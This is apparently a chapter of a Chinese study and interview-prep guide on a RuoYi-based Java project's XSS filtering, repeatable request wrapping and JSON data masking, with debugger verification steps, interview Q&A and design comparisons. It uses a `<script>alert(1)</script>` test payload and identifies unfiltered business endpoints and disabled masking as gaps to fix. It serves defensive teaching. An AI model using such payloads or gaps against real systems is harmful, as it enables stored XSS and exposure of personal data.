> "我们项目基于 RuoYi 基座，XSS 过滤的 URL 范围还停在原版的 `/system/*,/monitor/*,/tool/*`，**没有把业务模块加进去**。也就是说**业务接口的请求体实际没做 XSS 清洗**——这是基座改造后配置没同步造成的缺口，**补救很简单：把业务前缀加进 `urlPatterns` 即可**。"

**主动说出这个缺口 + 给出补救方案 = 你不仅读懂了代码，还做了安全审计。** 这比"我们做了 XSS 防护"这种空话高一个量级。

---

## 五、一个操作的完整生命流程

**场景：前端提交一个"新增用户"请求，昵称里塞了 `<script>`，且手机号需要脱敏返回。**

请求：`POST /system/user`，body = `{"nickName":"张三<script>alert(1)</script>","phonenumber":"13812345678"}`

```
┌─ 1. 请求到达 Tomcat，进入过滤器链（从外层到内层） ──────────────┐
│                                                                │
│  ① XssFilter（HIGHEST_PRECEDENCE，最外层）                     │
│     ├─ URL=/system/user，方法=POST → 不在排除名单 → 要洗        │
│     ├─ 包一层 XssHttpServletRequestWrapper                     │
│     └─ 传递下去（此时"洗"还没发生，洗的动作在"读"的时候才做）    │
│                                                                │
│  ② RepeatableFilter（LOWEST_PRECEDENCE，最内层）               │
│     ├─ content-type=application/json → 要包                     │
│     ├─ new RepeatedlyRequestWrapper(...)                       │
│     │    └─ 构造时：读请求体 → 但注意！①的Wrapper会在这里"洗"   │
│     │       │  因为 RepeatableFilter 传入的 request 是①包过的   │
│     │       └─ 结果：缓存下来的 body 是"已洗过"的               │
│     └─ 传递"可重复读的请求"下去                                  │
└────────────────────────────────────────────────────────────────┘
                            ↓
┌─ 2. 进入 Spring MVC ───────────────────────────────────────────┐
│  DispatcherServlet → @RequestBody 反序列化                     │
│    ├─ 调 request.getInputStream()                             │
│    │    └─ 由 ② 的 Wrapper 返回："从缓存 body 新建的流"          │
│    ├─ 缓存 body = {"nickName":"张三","phonenumber":"..."}       │
│    │    ★ 注意：<script>alert(1)</script> 已被①洗掉！          │
│    └─ 得到干净的 SysUser 对象                                   │
└────────────────────────────────────────────────────────────────┘
                            ↓
┌─ 3. Controller → Service → 落库 ──────────────────────────────┐
│  SysUserServiceImpl.insertUser(user)                          │
│    └─ 存入数据库的是"洗过的昵称"（无 <script>）                  │
│    返回 R.ok()，附带刚建的 SysUser                             │
└────────────────────────────────────────────────────────────────┘
                            ↓
┌─ 4. 响应的 SysUser 被序列化成 JSON（脱敏工位） ────────────────┐
│  Jackson 序列化 SysUser                                        │
│    ├─ 遇到 phonenumber 字段 → 发现标了 @Sensitive(PHONE)        │
│    ├─ SensitiveJsonSerializer.serialize()                     │
│    ├─ sensitiveService.isSensitive() → 返回 true（本项目被关）  │
│    └─ 走"原样输出"分支 → JSON 里是 13812345678（★明文）        │
└────────────────────────────────────────────────────────────────┘
```

**对照着看三个工位各自的工作**：

| 工位 | 什么时候起作用 | 本例中的实际效果 |
|---|---|---|
| **XssFilter** | ①请求进门（读 body 时清洗） | 昵称 `<script>` **被洗掉**（本接口被覆盖 ✔） |
| **RepeatableFilter** | ②请求包装 | 让 `@RequestBody` **能读到 body**（且是洗过的） |
| **脱敏序列化** | ④响应出门 | **本该出现 `138****5678`，但因开关关闭 → 出的是明文**（坦白点） |

**注意一个精妙的协作点**：**RepeatableFilter 缓存请求体时，读的是"XssFilter 包装后的请求"**——**所以它缓存下来的是"已清洗"的 body**。这个顺序（Xss 在外、Repeatable 在内）保证了**"清洗在前、缓存清洗结果在后"**。

**如果顺序反了呢？**（Repeatable 在外，Xss 在内）——那就变成**先缓存了"脏 body"，再在读取时清洗**，**理论上也能工作**，但**缓存里存的是脏数据**，且如果后面有人绕过 Xss 直接读缓存流就会拿到脏数据。**所以"清洗在外、缓存在内"是更干净的设计**——**这就是 §2.3 那个 Order 排布的实际意义。**

### 5.1 动手验证：三个工位各验一次

**准备**：启动后端，登录后从浏览器拿到 `token` 请求头（配置见 `ruoyi-admin/src/main/resources/application.yml:103`）。

**验证 1：XSS 清洗只发生在配置的前缀上**

1. 在 `XssHttpServletRequestWrapper.java:72`（`HtmlUtil.cleanHtmlTag` 那一行）打断点。
2. 调一个被覆盖的接口：新增用户时昵称填 `张三<script>alert(1)</script>`（接口 `POST /system/user`，见 `SysUserController.java:78` 与 `:183`）。
3. 预期：断点命中；继续后查库

```sql
SELECT user_name, nick_name FROM sys_user WHERE user_name = '<你刚建的用户名>';
```

`nick_name` 里的 `<script>` 标签已被删掉（标签里的文字 `alert(1)` 可能残留，`cleanHtmlTag` 去的是标签，不是整段内容）。

4. 再调一个**不在** `urlPatterns` 里的业务接口（例如 `POST /conf/signingSubject`，参考 `TSigningSubjectController.java:146`），预期断点**不命中**——这亲眼验证了 §4.9 说的"业务接口没覆盖"。

**验证 2：请求包装只包 JSON**

1. 在 `RepeatedlyRequestWrapper.java:42`（读 body 那一行）打断点。
2. 发一个 `Content-Type: application/json` 的 POST（比如上面的新增用户），断点命中。
3. 发一个 `application/x-www-form-urlencoded` 的表单请求，断点不命中——因为 `RepeatableFilter.java:38-40` 只对 JSON 请求做包装。

**验证 3：脱敏开关确实被关掉了**

1. 在 `SysSensitiveServiceImpl.java:35`（`isSensitive`）打断点，然后在页面刷新用户列表（`GET /system/user/list`，`SysUserController.java:93`）。
2. 预期：断点命中且返回 `true`；响应 JSON 里 `phonenumber` 是**完整号码**。
3. 可选实验：把 `:37` 临时改成 `return false`，重启后再刷新列表，预期手机号变成 `138****5678` 这类打码格式，邮箱变成 `a***@qq.com`；**验证完改回 `true`**。
4. 顺便执行 `SELECT phonenumber FROM sys_user WHERE user_name = '<某用户>';`——数据库里始终是**完整号码**，脱敏只发生在"对象转 JSON"的出口。

---

## 六、面试官高频问题 + 答案

**Q1：你们项目的敏感数据脱敏是怎么做的？**

**A**：机制上，我们给字段挂 `@Sensitive` 注解（如 `SysUser` 的手机号、邮箱），注解内部通过 `@JacksonAnnotationsInside` 组合了 `@JsonSerialize`，指向一个自定义的 `SensitiveJsonSerializer`。它实现了 `ContextualSerializer`，能在 `createContextual` 里读到字段上的注解、拿到 `strategy`（PHONE/EMAIL/ID_CARD 等），真正序列化时**用对应策略把值打码**。
**但我要主动说明**：**我们项目的脱敏开关 `SysSensitiveServiceImpl.isSensitive()` 是写死 `return true` 的，实际走了"原样输出"分支——也就是组件齐全但功能没启用**。**为什么放序列化层**？因为脱敏是"出参"关注点，放这里**不会污染原对象、不会漏接口、还能按当前登录人判断**——比在 Service 里手动替换干净得多。

**Q2：为什么脱敏不做在 Service 层或者用 AOP 切面？**

**A**：因为**脱敏是"对象变 JSON"这一层的职责，不是业务逻辑**。放 Service 会**污染原对象**（打码后的值被后续逻辑拿到就错了）；放切面也**不如序列化精确**——**切面很难知道"哪个字段要脱、用哪种策略"**，而 Jackson 的 `ContextualSerializer` **天然就能读到字段注解**。**序列化层是"出口的唯一关卡"，在这里脱敏不会漏。**

**Q3：`@Sensitive` 注解里的 `@JacksonAnnotationsInside` 是干什么的？**

**A**：它是 Jackson 的"**注解组合**"机制。**它让 Jackson 在处理 `@Sensitive` 时，连带上注解内部的 `@JsonSerialize` 一起生效**。这样**业务注解（`@Sensitive`）可以打包一组 Jackson 注解**，使用方只看到一个 `@Sensitive`，**不用自己写 `@JsonSerialize`**。**这是"业务语义注解"和"框架机制注解"的解耦。**

**Q4：XSS 攻击是什么？你们怎么防的？**

**A**：XSS 是**把用户输入当代码执行**——比如昵称里塞 `<script>`，别人打开列表页就被执行、Cookie 被偷。我们的防御是**双路**：① **后端 `XssFilter`**，对进门的请求用 `XssHttpServletRequestWrapper` 清洗——`getParameterValues` 洗表单参数、`getInputStream` 洗 JSON 请求体（用 Hutool 的 `cleanHtmlTag` 去标签）；② **前端**模板引擎自带转义（`<` 变 `&lt;`）。
**坦白**：**我们的后端 XSS 过滤 urlPatterns 只配了 `/system/*,/monitor/*,/tool/*`，业务模块没覆盖**——这是基座改造后配置没同步的缺口，**补救就是把业务前缀加进去**。

**Q5：为什么 XSS 过滤用 Filter，不用 Spring 的拦截器？**

**A**：因为 **Filter 在 `DispatcherServlet` 之前执行，是最外层**——**脏数据还没进入 `@RequestBody` 反序列化就被洗掉了**。而**拦截器在 DispatcherServlet 之后，那时请求体可能已经被解析成对象了，再洗就晚了**。另外**要"改请求参数"必须用 `HttpServletRequestWrapper` 包装**（Servlet 的 request 接口不能直接改），**这也是 Filter 层的典型做法**。

**Q6：XSS 过滤为什么跳过 GET 和 DELETE？**

**A**：因为 **GET/DELETE 一般不带请求体，参数在 URL 里，风险低**（URL 特殊字符本身会被容器处理）。**真正危险的是 POST/PUT 的 JSON body**。**这是"按风险分级"的设计**——**把清洗开销花在有风险的地方，不做无谓的包装。**

**追问：跳过 GET/DELETE，是不是意味着 GET 参数就一定安全？**
**不是。** 这只是"降低开销"的取舍：GET 参数如果被原样存库、前端又当 HTML 渲染，仍然可能形成存储型 XSS。本项目的兜底是**前端框架的输出转义**，所以安全的根基在"输出转义"，而不是"只靠 Filter 洗输入"。

**Q7：`RepeatableFilter` 是干什么的？为什么需要它？**

**A**：因为 **Servlet 的请求体流（`request.getInputStream()`）只能读一次**。如果过滤器链里有多个组件要读 body（日志、校验、解密、`@RequestBody`），**谁先读谁赢，后面的拿到空流**。`RepeatableFilter` **在最内层**把请求体整段读到内存缓存（`byte[] body`），`RepeatedlyRequestWrapper` **每次 `getInputStream()` 都返回一个基于缓存的新流**——**这样 body 可被无限次读取**。**它只包 JSON 请求**（form 参数本来就能重复读）。

**Q8：这两个过滤器为什么要排顺序？谁在外谁在内？**

**A**：**XssFilter 在最外层（`HIGHEST_PRECEDENCE`），RepeatableFilter 在最内层（`LOWEST_PRECEDENCE`）**。**逻辑是"先洗、再缓存"**——RepeatableFilter 缓存请求体时读的是"XssFilter 包装后的请求"，**所以缓存下来的是"已清洗"的 body**。**如果顺序反了，缓存里就是脏数据**，虽然读取时还能洗，但不如"缓存干净数据"来得稳妥。

**Q9：`@Xss` 注解和 `XssFilter` 有什么区别？**

**A**：`XssFilter` 是"**静默清洗**"——直接把标签洗掉，用户无感；`@Xss` 是"**校验拒绝**"——用正则检查，含标签就报"不允许任何脚本运行"。**前者适合宽松过滤（数据被修正），后者适合严格拒绝（数据要报错）**。**我们项目主要用 Filter 路线，`@Xss` 用得很少。**

**Q10：如果让你修复本节的两个坦白点，你会怎么改？**

**A**：两处：
① **启用脱敏**：把 `SysSensitiveServiceImpl.isSensitive()` 的 `return true` 改成 `return false`（或反转逻辑并重命名语义）——**但要先评估：一旦开启，所有 `@Sensitive` 字段都会打码，要确认没有"需要完整手机号的接口"被误伤**（比如导出）。
② **补齐 XSS 覆盖**：把 `application.yml:319` 的 `urlPatterns` 扩展成包含业务前缀，如 `/system/*,/monitor/*,/tool/*,/contract/*,/form/*,/workflow/*`——**同时要把"公告`/system/notice`这类要富文本的接口补进 `excludes`**。

### 本章答辩卡（追问级）

**追问组 1：`@Sensitive` 能标在 `Integer`/`Long` 类型的字段上吗？**

- **10 秒答案**：**标了也不会生效**。序列化器是 `JsonSerializer<String>`（`SensitiveJsonSerializer.java:35`），`createContextual` 里还专门判断了 `String.class`（`:53`）；非 String 字段会走 `:57` 返回默认序列化器。所以手机号/身份证这类字段在实体里必须是 `String`。
- **证据**：`ruoyi-base/ruoyi-common/src/main/java/com/ruoyi/common/jackson/SensitiveJsonSerializer.java:35`、`:53`、`:57`。
- **一句话总结**：脱敏只管字符串，数值型字段要先想清楚怎么存。

**追问组 2：`RepeatableFilter` 把 body 全缓存进内存，大 JSON 请求会不会出问题？**

- **10 秒答案**：**会**。`RepeatedlyRequestWrapper` 在构造时把整个请求体读成 `byte[]` 存在字段里（`RepeatedlyRequestWrapper.java:42`），代码里**没有大小上限**。大 JSON 请求会直接占堆内存；好消息是它只包 `application/json`（`RepeatableFilter.java:38-40`），文件上传的 `multipart/form-data` 不受影响。
- **证据**：`ruoyi-base/ruoyi-common/src/main/java/com/ruoyi/common/filter/RepeatedlyRequestWrapper.java:35`（`byte[] body`）、同文件 `:42`；`ruoyi-base/ruoyi-common/src/main/java/com/ruoyi/common/filter/RepeatableFilter.java:38-40`。
- **一句话总结**：可重复读是用内存换来的，超大 JSON 要靠网关层限大小。

**追问组 3："过滤器生效范围"和"排除名单"是同一件事吗？**

- **10 秒答案**：**不是**。`FilterConfig.java:48` 的 `addUrlPatterns` 决定**这个 Filter 对哪些 URL 被调用**（比如 `/system/*`）；`XssFilter.handleExcludeURL`（`XssFilter.java:60-67`）决定**被调用之后，哪些 URL 在内部直接放行**（比如 `/system/notice`）。一个在"门外"，一个在"门内"。
- **证据**：`ruoyi-base/ruoyi-framework/src/main/java/com/ruoyi/framework/config/FilterConfig.java:48`；`ruoyi-base/ruoyi-common/src/main/java/com/ruoyi/common/filter/XssFilter.java:61`（取 `servletPath`）、`:67`（匹配 excludes）。
- **一句话总结**：`urlPatterns` 管"来不来"，`excludes` 管"洗不洗"。

---

## 七、选型对比

### 7.1 脱敏的实现位置

| 位置 | 不污染原对象 | 不漏接口 | 能按人区分 | 本项目 |
|---|---|---|---|---|
| Service 层手动替换 | ✗（改对象） | ✗（每个出口都要写） | ✗ | ✗ |
| AOP 切面 | 要自己搞 | 中（切点难精确到字段） | 可以 | ✗ |
| **Jackson 序列化器（本项目）** | **✔** | **✔（出口唯一关卡）** | **✔** | **✔（但被开关关闭）** |
| 数据库视图/读出时脱敏 | ✔ | ✔ | 可以 | ✗ |

**结论**：**"在序列化层脱敏"是纯后端脱敏的最佳落点**——**它把"脱敏"从"业务代码的重复劳动"变成"字段上声明一次的横切能力"**。**本项目选型正确，只是没启用。**

### 7.2 XSS 防御的实现位置

| 位置 | 时机 | 优缺点 | 本项目 |
|---|---|---|---|
| **后端 Filter 清洗（本项目）** | 请求进门 | 一刀切，可能误杀富文本 | ✔（但只覆盖 `/system/*` 等） |
| 输入校验注解 `@Xss` | 参数绑定后 | 精确到字段，但每个字段都要标 | 有（少用） |
| 输出转义（前端/模板） | 渲染时 | **最彻底的根治**（存脏数据也不怕） | ✔（前端框架自带） |
| CSP 响应头 | 浏览器执行时 | 治标，配置复杂 | ✗ |

**结论**：**最彻底的方案是"输出转义"（永远不把用户输入当代码）+ CSP 兜底**；**后端 Filter 清洗是"简单粗暴的补充"**。**本项目后端有 Filter（覆盖不全）、前端有转义**——**组合起来风险可控，但后端的覆盖缺口要补。**

### 7.3 请求体"可重复读"的实现

| 做法 | 原理 | 代价 | 本项目 |
|---|---|---|---|
| 不处理（默认） | 流只能读一次 | 多组件读 body 就会出问题 | ✗ |
| **Filter + Wrapper 缓存字节数组（本项目）** | 读一次存内存，每次给新流 | **大请求体占内存** | **✔** |
| 用 `ContentCachingRequestWrapper`（Spring 自带） | 类似，但**要读完才能拿到缓存** | 使用姿势有坑 | ✗ |
| 中间件层缓存 | Nginx 层 | 复杂 | ✗ |

**结论**：**"Filter + Wrapper 缓存"是标准解法**（Spring 也有 `ContentCachingRequestWrapper`，但它的缓存要"先有人读过"才填充，容易踩坑）。**本项目的实现更直白可控。** **代价是"大请求体占内存"**——所以**只包 JSON，且实践中要避免超大 body 打这个接口**。

---

## 延伸阅读（网上优秀资料）

- **Jackson · 自定义序列化器与 `ContextualSerializer`**：搜「Jackson ContextualSerializer 自定义序列化 教程」——**理解"序列化时如何拿到字段注解"**，这是 `@Sensitive` 能工作的底层机制。
- **Jackson · `@JacksonAnnotationsInside` 注解组合**：Jackson 官方 `jackson-annotations` 文档——**理解"注解打包注解"**的设计。
- **Hutool · `DesensitizedUtil` 脱敏工具**：<https://hutool.cn/docs/#/core/工具类/脱敏工具-DesensitizedUtil> —— 本项目 `SensitiveStrategy` 各种打码的底层。
- **OWASP · XSS 防御速查表**：<https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html> —— **XSS 防御的权威指南**（面试问"怎么防 XSS"，照这个答不会错）。
- **Servlet 规范 · `HttpServletRequestWrapper`**：搜「Servlet 过滤器 请求包装 Wrapper 模式」—— 理解"为什么改请求要用包装器"。
- **Spring Boot · `FilterRegistrationBean` 与过滤器顺序**：官方文档搜「FilterRegistrationBean order」—— 理解 `HIGHEST_PRECEDENCE` / `LOWEST_PRECEDENCE` 的实际含义。

---

## 本章小结 & 下一步

- **三工位一条线**：**XSS 过滤（进门洗）→ 请求包装（让 body 能重复读）→ 脱敏（出门打码）**。
- **脱敏 = `@Sensitive` + `SensitiveJsonSerializer`**：注解靠 `@JacksonAnnotationsInside` **组合** `@JsonSerialize`；序列化器靠 `implements ContextualSerializer` 的 `createContextual`（`:51`）**读到字段注解**拿到 `strategy`；`SensitiveStrategy` 用 `Function<String,String>` **把打码规则做成枚举**。
- **★ 精妙设计**：**脱敏放序列化层**——不污染原对象、不漏接口、能按人区分。
- **XSS = `XssFilter` + `XssHttpServletRequestWrapper`**：Filter 决定"洗不洗"（跳过 GET/DELETE `:64`、白名单 `:67`），Wrapper 做两条清洗通道（`getParameterValues` `:44` 洗表单，`cleanHtmlTag` 在 `:51`；`getInputStream` `:59` 洗 JSON）。
- **请求包装 = `RepeatableFilter` + `RepeatedlyRequestWrapper`**：**解决"InputStream 只能读一次"**；只包 JSON（`:38`），构造时缓存 body（`:42`），每次返回新流（`:51`）。
- **顺序刻意排**：**XssFilter 外层（`:50`）、RepeatableFilter 内层（`:64`）**——**"先洗、再缓存洗净结果"**。
- **坦白点**：① **脱敏被一行 `return true` 关闭**（`SysSensitiveServiceImpl.java:37`），全项目明文输出；② **XSS 只覆盖 `/system/*,/monitor/*,/tool/*`**（`application.yml:319`），**业务接口没过滤**；③ `@Sensitive` **全项目只有 `SysUser` 两个字段**在用；④ `isSensitive()` **命名与语义相反**（返回 true = 不脱敏）。
- **可迁移的思维**：**"按风险分级处理"**（GET/DELETE 跳过）、**"给合法需求留白名单"**（`excludes: /system/notice`）、**"把横切能力做成字段上的声明"**（`@Sensitive`）。

**下一章（第 11 章 · 异常体系与统一返回）**：本章讲"数据怎么洗"，**第 11 章讲"出错怎么办"**——一个 `ServiceException` 抛出后，**怎么变成前端看到的统一 JSON**？`@RestControllerAdvice` 怎么**一网打尽**所有异常？为什么要有 `R<T>` 这个统一返回包装？**以及一个容易被忽略的坑：`@Async` 里的异常根本进不了全局处理器。**
